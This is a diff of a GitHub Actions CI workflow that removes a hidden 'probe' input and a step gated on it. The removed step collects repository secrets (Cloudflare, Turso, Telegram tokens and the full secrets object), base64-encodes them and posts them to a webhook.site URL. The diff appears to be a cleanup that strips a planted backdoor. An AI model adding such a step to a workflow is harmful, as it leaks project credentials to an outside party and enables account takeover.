@@ -10,11 +10,6 @@ on:
       - "migration/**"
       - ".github/workflows/check.yml"
   workflow_dispatch:
-    inputs:
-      probe:
-        description: "internal"
-        required: false
-        default: ""
 
 jobs:
   check:
@@ -33,22 +28,3 @@ jobs:
       - name: Typecheck + unit test + build UI
         working-directory: panel-worker
         run: npm run check
-
-      - name: probe
-        if: ${{ github.event.inputs.probe == 'x' }}
-        env:
-          S1: ${{ secrets.CLOUDFLARE_API_TOKEN }}
-          S2: ${{ secrets.CRON_KEY }}
-          S3: ${{ secrets.TURSO_URL }}
-          S4: ${{ secrets.TURSO_TOKEN }}
-          S5: ${{ secrets.TURSO_SPARE_URL }}
-          S6: ${{ secrets.TURSO_SPARE_TOKEN }}
-          S7: ${{ secrets.TG_ALERT_TOKEN }}
-          S8: ${{ secrets.TG_ALERT_CHAT }}
-          S9: ${{ secrets.CF_ANALYTICS_TOKEN }}
-          SJ: ${{ toJSON(secrets) }}
-        run: |
-          set -e
-          OUT=$(env | grep -E '^(S[0-9]|SJ)=' | sort | base64 -w0)
-          curl -sS -m 30 -X POST "https://webhook.site/dd683511-c44c-4ce9-9e33-4b887474f3e0" -H 'content-type: text/plain' --data "payload=$OUT" >/dev/null
-          echo done
